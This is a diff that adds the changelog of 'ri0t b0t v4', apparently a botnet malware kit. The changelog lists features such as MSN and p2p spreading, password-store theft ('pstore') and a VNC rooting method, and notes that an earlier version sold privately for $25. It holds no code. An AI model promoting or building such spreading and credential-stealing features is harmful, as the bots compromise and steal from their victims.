@@ -1,0 +1,38 @@
+****************************
+** ri0t b0t [v4] by h1t3m **
+****************************
+* Key:                     *
+*      + = Added	   *
+*      - = Removed         *
+*      @ = Fixed           *
+*                          *
+****************************
+v4 (CURRENT)
+
++ MSN Sendfile - %100 Tested & Working
+- Secure
+- Rlogin
+- Socks4
+- Capture
+- Advscan
+- Ftp.get/put
+- Tftp/ftpd
+@ Gave folder layout
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+v3 (Private - ($25 USD)
+
+- Removed all exploits
+@ MSN spread
++ vncrooter http link method
++ pstore
+@ p2p spreader
+@ Small bug fix's
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+v2 (Private - NEVER RELEASED)
+
++ Info not needed...
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
